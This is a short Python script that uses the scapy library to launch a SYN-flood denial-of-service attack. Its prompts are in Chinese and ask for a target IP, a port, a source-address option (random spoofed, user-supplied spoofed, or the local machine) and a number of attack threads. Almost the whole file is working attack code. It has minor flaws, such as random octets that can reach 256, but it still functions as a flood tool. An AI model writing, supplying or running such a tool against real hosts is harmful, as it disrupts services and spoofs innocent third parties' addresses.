from scapy.all import *
import random
from scapy.layers.inet import TCP, IP
import socket,threading

dst=""
dport=0

class flood_SYN(threading.Thread):
    global dport,dst
    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        sport = random.randint(1, 65535)
        ip = IP(src=src, dst=dst)
        tcp = TCP(sport=sport, dport=dport)
        SYN = ip / tcp
        print(SYN.summary())
        send(SYN,verbose=0)

#def SYNFlood(src, dst, dport):
#    sport = random.randint(10000, 65535)
#    ip = IP(src=src, dst=dst)
#    tcp = TCP(sport=sport, dport=dport)
#    SYN = ip / tcp
#    print(SYN.summary())
#    send(SYN)


def randomIP():
    ip = ''
    for i in range(3):
        ip += str(random.randint(0, 256))
        ip += '.'
    ip += str(random.randint(0, 256))
    return ip


def localIP():
    s=''
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    finally:
        s.close()

    return ip


if __name__ == "__main__":
    src = ''
    dst = input("请输入要攻击的目标IP：")
    dport = int(input("请输入要攻击的目标端口："))
    print("源地址如何选择？\n")
    print("1 随机生成\t2 由我输入\t3 使用本机（若本机IP地址较多，则不建议使用）")
    src_choice = input()

    if src_choice == '1':
        print("警告：随机生成的IP地址的主机可能很反感未经授权的[SYN,ACK]半连接！")
    elif src_choice == '2':
        src = input("请输入要伪装的源地址IP：")
    elif src_choice == '3':
        src = localIP()
    else:
        print("无效输入！")
        exit(1)

    times = int(input("请输入攻击次数："))
    for i in range(times):
        if src_choice == '1':
            src = randomIP()
        flood_SYN().start()
